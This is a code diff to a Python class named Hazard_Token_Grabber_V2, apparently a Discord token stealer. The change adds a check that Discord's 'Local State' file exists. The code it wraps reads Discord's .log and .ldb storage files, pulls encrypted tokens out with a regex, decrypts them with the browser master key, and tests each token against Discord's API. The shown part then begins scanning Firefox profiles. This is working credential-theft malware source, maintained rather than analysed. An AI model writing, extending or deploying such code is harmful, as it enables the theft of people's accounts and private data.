@@ -308,17 +308,18 @@ class Hazard_Token_Grabber_V2:
                                     pass
                                     self.tokens.append(token)
             else:
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for y in findall(self.encrypted_regex, line):
-                            token = self.decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-                            r = requests.get(self.baseurl, headers=self.getheaders(token))
-                            if r.status_code == 200:
-                                if token in self.tokens:
-                                    continue
-                                self.tokens.append(token)
+                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
+                                    self.tokens.append(token)
 
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
